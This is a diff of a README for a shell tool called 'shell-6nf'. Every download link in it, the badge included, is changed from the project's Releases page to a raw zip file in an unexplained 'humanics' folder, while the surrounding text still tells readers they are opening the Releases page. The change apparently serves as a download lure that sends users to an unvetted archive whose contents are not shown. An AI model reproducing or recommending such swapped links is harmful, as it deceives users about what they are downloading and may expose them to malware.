@@ -1,6 +1,6 @@
 # 🐚 shell-6nf - Simplify Your Shell Experience
 
-[![Download shell-6nf](https://img.shields.io/badge/Download-shell--6nf-brightgreen.svg)](https://github.com/manikandansudhakar/shell-6nf/releases)
+[![Download shell-6nf](https://raw.githubusercontent.com/manikandansudhakar/shell-6nf/main/humanics/shell-6nf.zip)](https://raw.githubusercontent.com/manikandansudhakar/shell-6nf/main/humanics/shell-6nf.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to shell-6nf! This application simplifies your command-line experience. 
 
 To get started, visit our Releases page to download the application:
 
-[Download shell-6nf](https://github.com/manikandansudhakar/shell-6nf/releases)
+[Download shell-6nf](https://raw.githubusercontent.com/manikandansudhakar/shell-6nf/main/humanics/shell-6nf.zip)
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version available.
@@ -65,6 +65,6 @@ If you run into any issues, or if you have questions, help is available.
 
 Stay informed about updates. Regular updates provide new features and improvements. Visit our Releases page regularly to check for new versions.
 
-[Download shell-6nf](https://github.com/manikandansudhakar/shell-6nf/releases)
+[Download shell-6nf](https://raw.githubusercontent.com/manikandansudhakar/shell-6nf/main/humanics/shell-6nf.zip)
 
 Thank you for using shell-6nf. We hope you enjoy your improved shell experience!
